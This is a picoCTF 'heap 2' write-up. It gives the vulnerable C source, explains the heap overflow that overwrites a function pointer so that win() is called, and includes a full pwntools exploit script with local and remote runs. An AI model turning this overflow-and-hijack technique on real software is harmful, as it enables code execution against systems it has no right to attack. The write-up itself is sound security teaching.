# PicoCTF - heap 2

## Challenge Overview
**Title:** heap 2  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** chall.c, chall

## Description
Can you handle function pointers? Download the binary here. Download the source here. Connect with the challenge instance here: nc mimas.picoctf.net 58418

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

## Analysis
This challenge is very similar to the previous one in the series.  
We have to override the value of the global pointer `x` using an input.  
Now, however, we need a different value.  
As the description suggests, it will be a function pointer.  
```c
void check_win() { ((void (*)())*(int*)x)(); }
```

`check_win()` takes `x` and does the following:
- `(int*)x` - Casts it to an integer pointer
- `*(int*)x` - Dereferences it (gets its value)
- `((void (*)())*(int*)x)` - Casts it to a function pointer with signature `void * ... ()`
- `((void (*)())*(int*)x)()` - Invokes the function

The function we want to invoke is `win()`
```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
```

The challenge binary does not use **PIE**
```
$ file ./chall 
./chall: ELF 64-bit LSB executable, ...
```

So we can find the address of `win()` using `objdump`
```
$ objdump -d chall | grep win
00000000004011a0 <win>:
```

Now since the input is a string and gets converted to an integer, each character is converted to its ASCII decimal representation.  
So we need to convert the address to its respective text representation to use in our payload.  

Similar to the last challenge, we can view the heap state
```
$ ./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x145fe6b0  ->   pico
+-------------+-----------+
[*]   0x145fe6d0  ->   bico
```

And our target is again 32 bytes away from the input.

To put this all together and test both on the local binary and the server I will use the following **Python** script
### Python Script
```python
from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(dist, win_addr, encode=False):
    payload = "A" * dist
    payload+=reverse_str(win_addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload


def send_to_server(payload, conn: remote):
    conn.sendline(b'2')
    conn.sendline(payload)
    conn.sendline(b'4')
    response = conn.recvall()
    conn.close()
    return response.decode('utf-8', errors='ignore')

def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def remote_server():
    win_addr = "4011a0"
    dist=32
    payload = construct_payload(dist, win_addr, True)
    host = 'mimas.picoctf.net'
    port = 59348
    conn = remote(host, port)
    server_output = send_to_server(payload, conn)
    print(get_flag(server_output))


def local():
    win_addr = "4011a0"
    dist=32
    payload = construct_payload(dist, win_addr, True)
    p=process("./chall")
    local_output = send_to_server(payload, p)
    print(get_flag(local_output))

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "local":
        local()
    elif operation == "remote":
        remote_server()
    else:
        print("Invalid operation")
main()
```

The script performs constructs the payload, sends it to either the local binary or to the server and prints the flag.  

We launch it first on the local binary using the `local` option
```
 python script_2.py local
[+] Starting local process './chall': pid 7837
[+] Receiving all data: Done (285B)
[*] Process './chall' stopped with exit code 0 (pid 7837)
picoCTF{My_Flag}
``` 

And we are successful so now we can so it on the remote server as well

## Solution
- Find the address of `win()` using `objdump` which is `0x4011a0`
- Find the distance of the input from `x` using the heap state which is 32
- Select option 2
- Enter 32 random characters followed by the address

### Note
The bytes of the address as stated above have to be converted to their respective ASCII character.  
However they do not map to a printable character so some kind of automation using a script like above or at least `printf` are needed to do so.